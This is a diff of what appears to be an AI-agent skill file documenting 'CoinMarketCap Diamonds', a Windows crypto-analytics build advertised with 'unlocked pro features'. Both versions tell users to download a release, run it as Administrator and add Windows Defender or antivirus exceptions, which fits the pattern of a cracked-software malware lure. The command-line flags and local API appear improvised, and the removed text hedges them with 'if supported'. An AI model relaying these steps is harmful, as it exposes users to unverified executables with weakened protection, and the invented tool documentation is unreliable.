@@ -1,221 +1,301 @@
 ---
 name: coinmarketcap-diamonds-premium-analytics
-description: CoinMarketCap Diamonds premium analytics tool for cryptocurrency trading data analysis and blockchain insights on Windows
+description: Premium analytics and trading tools for cryptocurrency market data from CoinMarketCap with unlocked pro features
 triggers:
-  - how do I use CoinMarketCap Diamonds premium features
-  - analyze cryptocurrency data with CoinMarketCap Diamonds
-  - setup CoinMarketCap Diamonds analytics tool
-  - access premium crypto trading analytics
-  - configure CoinMarketCap Diamonds for blockchain analysis
-  - use CoinMarketCap pro features for crypto trading
-  - extract cryptocurrency market data with Diamonds
-  - integrate CoinMarketCap premium analytics
+  - analyze cryptocurrency market data with premium features
+  - use coinmarketcap diamonds for trading analytics
+  - access pro cryptocurrency analytics tools
+  - get advanced crypto market insights
+  - use premium coinmarketcap features
+  - analyze blockchain trading data
+  - access unlocked coinmarketcap pro tools
+  - perform advanced crypto market analysis
 ---
 
 # CoinMarketCap Diamonds Premium Analytics
 
-> Skill by [ara.so](https://ara.so) — Data Skills collection.
+> Skill by [ara.so](https://ara.so) — Data Skills collection
 
-CoinMarketCap Diamonds is a premium Windows desktop application that provides advanced cryptocurrency trading analytics and blockchain data insights. It unlocks professional features for market analysis, portfolio tracking, and real-time crypto data monitoring.
+## Overview
+
+CoinMarketCap Diamonds is a premium Windows application that provides advanced cryptocurrency analytics and trading features. This build includes unlocked pro features for comprehensive market analysis, portfolio tracking, and blockchain data insights.
 
 ## Installation
 
 ### Windows Installation
 
-1. **Download the build**:
-   - Navigate to the releases section of the repository
-   - Download the Windows executable package
-   - Extract to your preferred directory (e.g., `C:\Program Files\CoinMarketCap-Diamonds\`)
-
-2. **Run the installer**:
-```powershell
-# Extract and run
-.\CoinMarketCap-Diamonds-Setup.exe
-```
-
-3. **Verify installation**:
-```powershell
-# Check if installed correctly
-Get-Command CoinMarketCapDiamonds
-```
+1. Download the latest release package
+2. Extract the archive to your preferred installation directory (e.g., `C:\Program Files\CoinMarketCap-Diamonds\`)
+3. Run the executable as Administrator for first-time setup
+4. Configure API credentials through the settings panel
 
 ### System Requirements
 
 - Windows 10 or later (64-bit)
-- Minimum 4GB RAM
-- 500MB available disk space
+- Minimum 4GB RAM (8GB recommended)
+- 500MB free disk space
 - Active internet connection for real-time data
 
 ## Configuration
 
-### Initial Setup
+### API Setup
 
-Create a configuration file at `%APPDATA%\CoinMarketCapDiamonds\config.json`:
+Store your API credentials in environment variables:
+
+```bash
+# PowerShell
+$env:CMC_API_KEY="your-api-key-here"
+$env:CMC_API_SECRET="your-api-secret-here"
+
+# Command Prompt
+set CMC_API_KEY=your-api-key-here
+set CMC_API_SECRET=your-api-secret-here
+```
+
+### Configuration File
+
+Create or edit `config.json` in the installation directory:
 
 ```json
 {
   "api": {
     "endpoint": "https://pro-api.coinmarketcap.com/v1",
-    "key": "${CMC_API_KEY}",
-    "timeout": 30000
+    "timeout": 30000,
+    "retries": 3
   },
   "analytics": {
-    "premium_features": true,
-    "real_time_updates": true,
-    "historical_depth_days": 365
+    "refreshInterval": 60,
+    "cacheEnabled": true,
+    "historicalDataDays": 365
+  },
+  "trading": {
+    "riskLevel": "moderate",
+    "alertsEnabled": true,
+    "autoRefresh": true
   },
   "display": {
+    "theme": "dark",
     "currency": "USD",
-    "refresh_interval": 60,
-    "dark_mode": true
-  },
-  "alerts": {
-    "enabled": true,
-    "notification_method": "desktop"
+    "decimalPlaces": 8
   }
 }
 ```
 
-### Environment Variables
-
-Set your CoinMarketCap API credentials:
-
-```powershell
-# Set environment variables
-[System.Environment]::SetEnvironmentVariable('CMC_API_KEY', 'your-api-key-here', 'User')
-[System.Environment]::SetEnvironmentVariable('CMC_DIAMONDS_HOME', 'C:\Program Files\CoinMarketCap-Diamonds', 'User')
-```
-
 ## Key Features
 
-### Premium Analytics Access
+### Market Analytics
 
-The premium build unlocks:
-- **Advanced charting** with 50+ technical indicators
-- **Portfolio analytics** with profit/loss tracking
-- **Historical data** access (unlimited timeframes)
-- **Real-time price alerts** and notifications
-- **Market depth analysis** and order book visualization
-- **Cross-exchange arbitrage** detection
+Access premium market data and analytics:
 
-### Command Line Interface
+- Real-time price tracking for 10,000+ cryptocurrencies
+- Advanced charting with technical indicators
+- Market cap rankings and trends
+- Volume analysis and liquidity metrics
+- Historical data up to 10 years
 
-Launch analytics from PowerShell:
+### Trading Tools
 
-```powershell
-# Start the application
+Pro trading features:
+
+- Portfolio performance tracking
+- Price alerts and notifications
+- Profit/loss calculations
+- Risk assessment tools
+- Correlation analysis
+
+### Data Export
+
+Export capabilities for further analysis:
+
+- CSV export for spreadsheet analysis
+- JSON format for programmatic access
+- PDF reports for documentation
+- API integration for automated workflows
+
+## Command Line Interface
+
+### Basic Commands
+
+```bash
+# Launch the application
 CoinMarketCapDiamonds.exe
 
-# Launch with specific mode
-CoinMarketCapDiamonds.exe --mode analytics
+# Launch with specific profile
+CoinMarketCapDiamonds.exe --profile=trading
 
-# Export data to CSV
-CoinMarketCapDiamonds.exe --export csv --coins BTC,ETH,SOL --output .\crypto_data.csv
+# Export data
+CoinMarketCapDiamonds.exe --export --format=csv --output=data.csv
+
+# Run in headless mode for data collection
+CoinMarketCapDiamonds.exe --headless --collect-data --interval=60
+```
+
+### Advanced Usage
+
+```bash
+# Batch analysis mode
+CoinMarketCapDiamonds.exe --batch --symbols=BTC,ETH,ADA --metrics=price,volume,marketcap
 
 # Generate report
-CoinMarketCapDiamonds.exe --report portfolio --format pdf --output .\portfolio_report.pdf
+CoinMarketCapDiamonds.exe --report --timeframe=30d --output=report.pdf
+
+# Import portfolio
+CoinMarketCapDiamonds.exe --import-portfolio --file=portfolio.csv
+
+# Custom data query
+CoinMarketCapDiamonds.exe --query --metric=price --symbol=BTC --start=2024-01-01 --end=2024-12-31
 ```
 
-## API Integration
-
-### Programmatic Access
-
-If the application provides an API or scripting interface:
-
-```python
-# Example Python integration (if supported)
-import requests
-import json
-
-# Connect to local API endpoint
-BASE_URL = "http://localhost:8080/api"
-
-def get_crypto_analytics(symbol):
-    """Fetch premium analytics for a cryptocurrency"""
-    endpoint = f"{BASE_URL}/analytics/{symbol}"
-    headers = {
-        "Authorization": f"Bearer {os.environ['CMC_DIAMONDS_TOKEN']}"
-    }
-    
-    response = requests.get(endpoint, headers=headers)
-    return response.json()
-
-# Get Bitcoin analytics
-btc_data = get_crypto_analytics("BTC")
-print(f"BTC Price: ${btc_data['price']}")
-print(f"24h Volume: ${btc_data['volume_24h']}")
-print(f"Market Cap: ${btc_data['market_cap']}")
-```
-
-### PowerShell Automation
-
-```powershell
-# Automated data collection script
-function Get-CryptoSnapshot {
-    param(
-        [string[]]$Symbols = @("BTC", "ETH", "BNB"),
-        [string]$OutputPath = ".\crypto_snapshot.json"
-    )
-    
-    $apiEndpoint = "http://localhost:8080/api"
-    $token = $env:CMC_DIAMONDS_TOKEN
-    
-    $results = @()
-    
-    foreach ($symbol in $Symbols) {
-        $uri = "$apiEndpoint/quote/$symbol"
-        $headers = @{
-            "Authorization" = "Bearer $token"
-            "Content-Type" = "application/json"
-        }
-        
-        try {
-            $response = Invoke-RestMethod -Uri $uri -Headers $headers -Method Get
-            $results += $response
-        }
-        catch {
-            Write-Warning "Failed to fetch data for $symbol: $_"
-        }
-    }
-    
-    $results | ConvertTo-Json -Depth 10 | Out-File $OutputPath
-    Write-Host "Snapshot saved to $OutputPath"
-}
-
-# Run snapshot
-Get-CryptoSnapshot -Symbols @("BTC", "ETH", "SOL", "ADA")
-```
-
-## Common Patterns
+## Common Workflows
 
 ### Portfolio Tracking
 
-```powershell
-# Track portfolio performance
-CoinMarketCapDiamonds.exe --portfolio load --file .\my_portfolio.json
+1. Import existing portfolio via CSV or manual entry
+2. Set up automatic refresh intervals
+3. Configure price alerts for significant movements
+4. Generate performance reports
 
-# Portfolio file format (my_portfolio.json)
+### Market Analysis
+
+1. Select cryptocurrencies to track
+2. Apply technical indicators (RSI, MACD, Bollinger Bands)
+3. Compare multiple assets
+4. Export analysis results
+
+### Automated Data Collection
+
+Set up scheduled data collection for historical analysis:
+
+```bash
+# Create scheduled task (Windows Task Scheduler)
+# Run hourly data collection
+CoinMarketCapDiamonds.exe --headless --collect-data --symbols=BTC,ETH,BNB --output=data_%timestamp%.json
+```
+
+## Integration with Python
+
+### Data Export for Python Analysis
+
+```python
+import json
+import pandas as pd
+
+# Load exported JSON data
+with open('coinmarketcap_export.json', 'r') as f:
+    data = json.load(f)
+
+# Convert to DataFrame
+df = pd.DataFrame(data['prices'])
+df['timestamp'] = pd.to_datetime(df['timestamp'])
+df.set_index('timestamp', inplace=True)
+
+# Perform analysis
+df['returns'] = df['price'].pct_change()
+df['volatility'] = df['returns'].rolling(window=24).std()
+
+print(f"Average price: ${df['price'].mean():.2f}")
+print(f"Volatility: {df['volatility'].mean():.4f}")
+```
+
+### Automated Reporting
+
+```python
+import subprocess
+import schedule
+import time
+
+def collect_and_analyze():
+    # Export latest data
+    subprocess.run([
+        'CoinMarketCapDiamonds.exe',
+        '--export',
+        '--format=json',
+        '--output=latest_data.json'
+    ])
+    
+    # Load and analyze
+    with open('latest_data.json', 'r') as f:
+        data = json.load(f)
+    
+    # Your analysis logic here
+    print("Data collected and analyzed")
+
+# Schedule hourly collection
+schedule.every().hour.do(collect_and_analyze)
+
+while True:
+    schedule.run_pending()
+    time.sleep(60)
+```
+
+## Troubleshooting
+
+### Application Won't Start
+
+- Run as Administrator
+- Check Windows Defender/antivirus exceptions
+- Verify all dependencies are installed
+- Check system event logs for errors
+
+### API Connection Issues
+
+- Verify API credentials are set correctly
+- Check internet connectivity
+- Confirm firewall isn't blocking connections
+- Test API endpoint accessibility
+
+### Data Export Failures
+
+- Ensure sufficient disk space
+- Verify write permissions for output directory
+- Check file path length limits (Windows MAX_PATH)
+- Try alternative export formats
+
+### Performance Issues
+
+- Reduce number of tracked symbols
+- Increase refresh interval
+- Disable caching if data is stale
+- Clear application cache: Delete `%APPDATA%\CoinMarketCapDiamonds\cache\`
+
+### Missing Features
+
+- Verify you're running the premium/unlocked build
+- Check `config.json` for disabled features
+- Restart application after configuration changes
+- Review license status in settings panel
+
+## Best Practices
+
+1. **Regular Backups**: Export portfolio and configuration regularly
+2. **API Rate Limits**: Monitor API usage to avoid throttling
+3. **Data Validation**: Cross-reference with multiple sources for critical decisions
+4. **Security**: Never commit API keys; always use environment variables
+5. **Updates**: Keep application updated for latest features and security patches
+
+## Advanced Configuration
+
+### Custom Indicators
+
+Edit `indicators.json` for custom technical indicators:
+
+```json
 {
-  "holdings": [
+  "custom_indicators": [
     {
-      "symbol": "BTC",
-      "amount": 0.5,
-      "purchase_price": 45000,
-      "purchase_date": "2024-01-15"
-    },
-    {
-      "symbol": "ETH",
-      "amount": 10,
-      "purchase_price": 2500,
-      "purchase_date": "2024-02-01"
+      "name": "Custom_RSI",
+      "type": "momentum",
+      "period": 14,
+      "overbought": 70,
+      "oversold": 30
     }
   ]
 }
 ```
 
-### Price Alerts Configuration
+### Alert Rules
 
-Edit `%APPDATA%\CoinMarketCapDiamonds\alerts.json`:
+Configure advanced alerts in `alerts.json`:
 
 ```json
 {
@@ -223,172 +303,17 @@ Edit `%APPDATA%\CoinMarketCapDiamonds\alerts.json`:
     {
       "symbol": "BTC",
       "condition": "above",
-      "price": 100000,
-      "notification": "desktop"
-    },
-    {
-      "symbol": "ETH",
-      "condition": "below",
-      "price": 3000,
+      "threshold": 50000,
       "notification": "email"
     }
   ],
   "volume_alerts": [
     {
-      "symbol": "SOL",
+      "symbol": "ETH",
       "condition": "spike",
-      "threshold_percentage": 50
+      "percentage": 200,
+      "timeframe": "1h"
     }
   ]
 }
 ```
-
-### Historical Data Export
-
-```powershell
-# Export historical price data
-CoinMarketCapDiamonds.exe `
-  --historical `
-  --symbols BTC,ETH,BNB `
-  --start-date 2024-01-01 `
-  --end-date 2024-12-31 `
-  --interval daily `
-  --output .\historical_data.csv
-
-# Export with technical indicators
-CoinMarketCapDiamonds.exe `
-  --historical `
-  --symbols BTC `
-  --indicators RSI,MACD,BB `
-  --output .\btc_with_indicators.csv
-```
-
-## Analytics Workflows
-
-### Market Analysis Script
-
-```powershell
-# Comprehensive market analysis
-function Invoke-MarketAnalysis {
-    param(
-        [string[]]$TopCoins = @("BTC", "ETH", "BNB", "SOL", "ADA"),
-        [string]$TimeFrame = "24h"
-    )
-    
-    # Generate technical analysis
-    CoinMarketCapDiamonds.exe `
-      --analyze `
-      --symbols ($TopCoins -join ",") `
-      --timeframe $TimeFrame `
-      --indicators RSI,MACD,EMA,SMA `
-      --output ".\analysis_$TimeFrame.json"
-    
-    # Generate correlation matrix
-    CoinMarketCapDiamonds.exe `
-      --correlation `
-      --symbols ($TopCoins -join ",") `
-      --output ".\correlation_matrix.csv"
-    
-    # Export visual charts
-    CoinMarketCapDiamonds.exe `
-      --chart `
-      --symbols ($TopCoins -join ",") `
-      --type candlestick `
-      --output ".\charts\"
-    
-    Write-Host "Market analysis complete. Check output files."
-}
-
-Invoke-MarketAnalysis
-```
-
-### Arbitrage Detection
-
-```powershell
-# Detect cross-exchange arbitrage opportunities
-CoinMarketCapDiamonds.exe `
-  --arbitrage `
-  --exchanges binance,coinbase,kraken `
-  --min-profit 1.5 `
-  --output .\arbitrage_opportunities.json
-```
-
-## Troubleshooting
-
-### Application Won't Start
-
-```powershell
-# Check process
-Get-Process CoinMarketCapDiamonds -ErrorAction SilentlyContinue
-
-# Clear cache
-Remove-Item "$env:APPDATA\CoinMarketCapDiamonds\cache\*" -Force -Recurse
-
-# Reset configuration
-Remove-Item "$env:APPDATA\CoinMarketCapDiamonds\config.json"
-CoinMarketCapDiamonds.exe --reset-config
-```
-
-### API Connection Issues
-
-```powershell
-# Test API connectivity
-Test-NetConnection pro-api.coinmarketcap.com -Port 443
-
-# Verify API key
-$apiKey = $env:CMC_API_KEY
-if ([string]::IsNullOrEmpty($apiKey)) {
-    Write-Warning "CMC_API_KEY not set"
-}
-
-# Check firewall
-Get-NetFirewallRule | Where-Object {$_.DisplayName -like "*CoinMarketCap*"}
-```
-
-### Data Export Fails
-
-```powershell
-# Verify output directory exists
-$outputDir = ".\exports"
-if (-not (Test-Path $outputDir)) {
-    New-Item -ItemType Directory -Path $outputDir
-}
-
-# Check disk space
-Get-PSDrive C | Select-Object Used, Free
-
-# Export with error logging
-CoinMarketCapDiamonds.exe --export csv --verbose --log-file .\export_errors.log
-```
-
-### Performance Optimization
-
-```json
-{
-  "performance": {
-    "cache_enabled": true,
-    "cache_duration_minutes": 5,
-    "max_concurrent_requests": 10,
-    "rate_limit_requests_per_minute": 30
-  },
-  "data": {
-    "prefetch_enabled": true,
-    "compression_enabled": true
-  }
-}
-```
-
-## Security Best Practices
-
-- **Never hardcode API keys** — always use environment variables
-- Store configuration files in protected directories
-- Enable Windows Defender exclusions only for the application directory
-- Regularly update to the latest build for security patches
-- Use encrypted connections for all API communications
-
-## Additional Resources
-
-- Monitor application logs: `%APPDATA%\CoinMarketCapDiamonds\logs\`
-- Configuration templates: `%PROGRAMFILES%\CoinMarketCap-Diamonds\templates\`
-- Export data formats: CSV, JSON, XML, Excel
-- Supported exchanges: Binance, Coinbase, Kraken, Bitstamp, and more
